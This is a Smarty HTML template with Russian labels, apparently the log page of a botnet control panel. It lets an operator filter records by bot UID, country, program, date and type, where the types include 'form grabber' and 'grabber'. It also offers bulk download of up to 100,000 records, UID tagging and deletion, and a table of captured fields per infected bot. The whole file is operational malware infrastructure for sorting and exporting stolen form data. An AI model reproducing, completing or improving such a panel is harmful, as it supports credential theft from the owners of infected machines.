<div style="position:relative; height: 22px;">
<div style="position: absolute; right: 5px; text-align: right;">Всего записей: {$count_items}</div>
<div style="position: absolute; left: 5px; text-align: left;">Название: {$filter->name} (<span onclick="load_uniq_bot('{$filter->id}', this)" id="uniq_{$filter->id}" style="font-size:10px; text-decoration:underline; cursor:pointer; color:#0000FF">Узнать количество уникальных ботов</span>)</div>
</div>
<hr />
<div style="text-align: right; padding-right: 10px; padding-left: 10px">
<form name="filters" id="filters" action="/logs/{if $filter->id}download-{$filter->id}.html{else}download.html?str={$filter->str}{/if}" method="post" target="_blank" enctype="application/x-www-form-urlencoded">
Префикс: <select name="prefix" style="width:600px">
<option value="">Все</option>
{foreach from=$prefix item=pref}
<option value="{$pref->prefix}"{if $smarty.post.prefix eq $pref->prefix}selected="selected"{/if}>{$pref->prefix}</option>
{/foreach}
</select>
<hr />
<span title="Маска UID без ПЕРФИКСА!">Маска UID:</span> <input name="mask_uid" type="text" style="width:600px" value="{$smarty.post.mask_uid}" />
<hr />
Страна: <select name="country" style="width:600px">
<option value="">Все</option>
{foreach from=$country item=c}
<option value="{$c->country}"{if $smarty.post.country eq $c->country}selected="selected"{/if}>{$c->country}</option>
{/foreach}
</select>
<hr />
Программа: <select name="program" style="width:600px">
<option value="">Все</option>
{foreach from=$programs item=prog}
<option value="{$prog->program}"{if $smarty.post.program eq $prog->program}selected="selected"{/if}>{$prog->program}</option>
{/foreach}
</select>
<hr />
Статус: <select name="status" style="width:600px">
<option value="">Все</option>
<option value="nuls"{if $smarty.post.status eq 'nuls'}selected="selected"{/if}>Новые</option>
<option value="1"{if $smarty.post.status eq '1'}selected="selected"{/if}>Старые (Когда либо скачанные)</option>
</select>
<hr />
Тип: <select name="type" style="width:600px">
<option value="">Все</option>
<option value="5"{if $smarty.post.type eq '5'}selected="selected"{/if}>ФормГраббер</option>
<option value="6"{if $smarty.post.type eq '6'}selected="selected"{/if}>Граббер</option>
</select>
<hr />
Дата добавления: <select id="data1" name="data1" style="width:298px">
<option value="ALL">Не учитывать</option>
{foreach from=$date item=d name=data1}
<option value="{$d->date}"{if $smarty.post.data1 eq $d->date} selected="selected"{/if}>{$d->date}</option>
{/foreach}
</select> <select id="data2" name="data2" style="width:298px">
<option value="ALL">Не учитывать</option>
{foreach from=$date item=d name=data2}
<option value="{$d->date}"{if $smarty.post.data2 eq $d->date} selected="selected"{/if}>{$d->date}</option>
{/foreach}
</select>
<hr />
Колличество: <select name="limit" style="width:600px"><option value="ALL">Все</option><option value="10">10</option><option value="100">100</option><option value="250">250</option><option value="500">500</option><option value="1000">1000</option><option value="2000">2000</option><option value="3000">3000</option><option value="4000">4000</option><option value="5000">5000</option><option value="10000">10000</option><option value="25000">25000</option><option value="50000">50000</option><option value="100000">100000</option></select>
<hr />
<label for="adduid">Добавлять UID-бота</label> <input type="checkbox" name="adduid" id="adduid" />
<hr />
<label for="delete">Удалить данные в данном фильтре с учетом фильтра и колличества</label> <input type="checkbox" name="delete" id="delete" />
<hr />
<input type="button" name="update" value="Обновить (без учета колличества)" style="width:49%" onclick="load_data_logs('/logs/{if $filter->id}logs-{$filter->id}.html?ajax=1{else}logs.html?str={$filter->str}&ajax=1{/if}');" />&nbsp;&nbsp;&nbsp;<input type="submit" name="submit" value="Скачать" style="width:49%"{if file_exists("cache/dlf/`$filter->id`") OR file_exists('cache/pid_import.txt')} disabled="disabled"{/if} />
</form>
</div>
<hr />
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
	<td style="width: 25px; text-align: center">#</td>
    {foreach from=$filter->fields->name item=fitem}
	<td style="text-align: center">{$fitem}</td>
    {/foreach}
	<td style="width: 60px; text-align: center">Страна</td>
    <td style="width: 120px; text-align: center">Программа</td>
	<td></td>
</tr>
{foreach from=$logs item=item name=logs}
{if $smarty.foreach.logs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="font-size: 10px;">
	<th height="19"><a href="#" onclick="load_data_log('{$item->id}', '{$filter->id}');">{$item->id}</a></th>
	{foreach from=$filter->fields->name item=fitem name=ditem}
    {assign var=tvar value=name_var($smarty.foreach.ditem.iteration)}
	<td style="text-align: center">{if strlen($item->$tvar) > 32}<span style="color:#F00">длинный для отображения</span>{else}{$item->$tvar}{/if}</td>
    {/foreach}
	<th>{$item->country}</th>
    <th>{$item->program}</th>
</tr>
{/foreach}
</table>
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>